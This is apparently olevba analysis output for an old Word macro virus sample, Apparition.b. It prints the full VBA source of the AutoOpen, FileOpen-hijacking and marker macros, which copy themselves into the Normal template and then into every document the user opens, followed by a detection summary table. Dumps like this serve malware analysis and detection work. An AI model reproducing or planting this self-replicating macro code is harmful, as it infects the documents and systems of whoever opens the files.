olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Apparition.b-491f40f89386e168bb7c77def842d78f85ee74cc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Apparition.b-491f40f89386e168bb7c77def842d78f85ee74cc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO DaniloffMuDaK.bas 
in file: Virus.MSWord.Apparition.b-491f40f89386e168bb7c77def842d78f85ee74cc - OLE stream: 'Macros/VBA/DaniloffMuDaK'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim OurCopyright$
Dim AVPcopyright$
Dim DowniloffCopyright$
Dim sQuestion$
Dim gnoi
Dim iCountMacros
Dim i
Dim zu$
' this macro loaded in normal template as FileOpen
OurCopyright$ = "Co-Copyright (cc) LordAsd and Stainless Steel Rat"
AVPcopyright$ = "AVP for WinWord v1.0"
DowniloffCopyright$ = "DaniloffMuDaK"
sQuestion$ = "Would you like to "

Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
On Error GoTo -1: On Error GoTo fail
WordBasic.CurValues.FileOpen dlg
WordBasic.Dialog.FileOpen dlg
WordBasic.FileOpen dlg
WordBasic.MsgBox WordBasic.[FileName$]()

gnoi = 0
iCountMacros = WordBasic.CountMacros(1, 0, 0)
For i = 1 To iCountMacros
 zu$ = WordBasic.[MacroName$](i, 1)
 If zu$ = "WWUpdated" Then gnoi = 1
Next i

If gnoi = 1 Then GoTo fail
WordBasic.FileSaveAs WordBasic.[FileName$](), Format:=1
WordBasic.MacroCopy "Normal:AutoOp", WordBasic.[FileName$]() + ":AutoOpen"
WordBasic.MacroCopy "Normal:WWUpdated", WordBasic.[FileName$]() + ":WWUpdated"
WordBasic.MacroCopy "Normal:FileOpen", WordBasic.[FileName$]() + ":DaniloffMuDaK"

WordBasic.MsgBox "Suxx"
fail:
End Sub
-------------------------------------------------------------------------------
VBA MACRO WWUpdated.bas 
in file: Virus.MSWord.Apparition.b-491f40f89386e168bb7c77def842d78f85ee74cc - OLE stream: 'Macros/VBA/WWUpdated'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
'Presence of AVP for winword
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Apparition.b-491f40f89386e168bb7c77def842d78f85ee74cc - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim hru
Dim j
Dim i
On Error GoTo -1: On Error GoTo fail
hru = 0
j = WordBasic.CountMacros(0, 0)
For i = 1 To j
 If WordBasic.[MacroName$](i, 0, 0) = "WWUpdated" Then hru = 1
Next i

If hru = 1 Then GoTo fail

WordBasic.MsgBox "Gnoi"

WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Normal:AutoOp"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":WWUpdated", "Normal:WWUpdated"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":DaniloffMuDaK", "Normal:FileOpen"
fail:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

